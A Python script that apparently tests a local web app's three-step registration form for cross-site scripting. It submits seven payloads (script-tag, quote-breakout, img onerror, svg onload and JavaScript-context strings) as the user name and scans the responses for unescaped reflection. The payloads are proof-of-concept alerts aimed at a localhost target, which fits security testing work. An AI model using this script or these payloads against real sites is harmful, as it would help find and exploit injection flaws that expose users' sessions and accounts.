import requests
from bs4 import BeautifulSoup

base_url = "http://127.0.0.1:32896"

print("="*80)
print("TESTING XSS IN REGISTRATION STEP 3 (Dynamically Generated JavaScript)")
print("="*80)

# Test different XSS payloads
xss_payloads = [
    ("normaluser", "Baseline test"),
    ("<script>alert(1)</script>", "Basic XSS"),
    ("test'><script>alert(1)</script>", "Quote breakout"),
    ('test"><script>alert(1)</script>', "Double quote breakout"),
    ("<img src=x onerror=alert(1)>", "Image onerror"),
    ("test<svg/onload=alert(1)>", "SVG onload"),
    ("';alert(1)//", "JavaScript context breakout"),
]

for payload, description in xss_payloads:
    print(f"\n{'='*80}")
    print(f"TEST: {description}")
    print(f"PAYLOAD: {payload}")
    print(f"{'='*80}")
    
    session = requests.Session()
    
    # Step 1
    r = session.get(f'{base_url}/accounts/register/step1/')
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    r = session.post(f'{base_url}/accounts/register/step1/', 
        data={'csrfmiddlewaretoken': csrf, 'name': payload, 'password': 'SecurePass123!'}, 
        headers={'Referer': f'{base_url}/accounts/register/step1/'})
    
    # Step 2
    soup = BeautifulSoup(r.text, 'html.parser'  )
    csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    r = session.post(f'{base_url}/accounts/register/step2/', 
        data={'csrfmiddlewaretoken': csrf, 'email': f'test{hash(payload)}@example.com'}, 
        headers={'Referer': f'{base_url}/accounts/register/step2/'})
    
    # Step 3 - Check the dynamically generated JavaScript
    print(f"\n[+] Step 3 Response:")
    print(f"[+] Status: {r.status_code}")
    print(f"[+] URL: {r.url}")
    
    # Extract the inline script
    soup = BeautifulSoup(r.text, 'html.parser')
    scripts = soup.find_all('script')
    
    for script in scripts:
        if not script.get('src'):  # Inline script
            content = script.string or ''
            if 'alert' in content.lower() or payload in content:
                print(f"\n[!!!] FOUND INLINE SCRIPT WITH PAYLOAD:")
                print(f"{'='*80}")
                print(content)
                print(f"{'='*80}")
    
    # Check if payload is directly in HTML
    if payload in r.text and '<script>' not in payload:
        print(f"\n[!] Payload found in HTML response")
        # Find context
        idx = r.text.find(payload)
        if idx != -1:
            context_start = max(0, idx - 150)
            context_end = min(len(r.text), idx + len(payload) + 150)
            context = r.text[context_start:context_end]
            print(f"\n[*] Context around payload:")
            print(f"{'='*80}")
            print(context)
            print(f"{'='*80}")
    
    # Check if script tags are in response unescaped
    if '<script>' in r.text.lower() and payload in r.text:
        print(f"\n[!!!] POTENTIAL XSS VULNERABILITY!")
        print(f"[!!!] Unescaped script tags found with user input!")
    
    # Check HTML encoding
    if '&lt;' in r.text or '&gt;' in r.text:
        print(f"\n[+] HTML encoding detected (safer)")
    
    # Save full HTML for analysis
    with open(f'/tmp/xss_test_{hash(payload)}.html', 'w') as f:
        f.write(r.text)
    print(f"\n[+] Full HTML saved to /tmp/xss_test_{hash(payload)}.html")

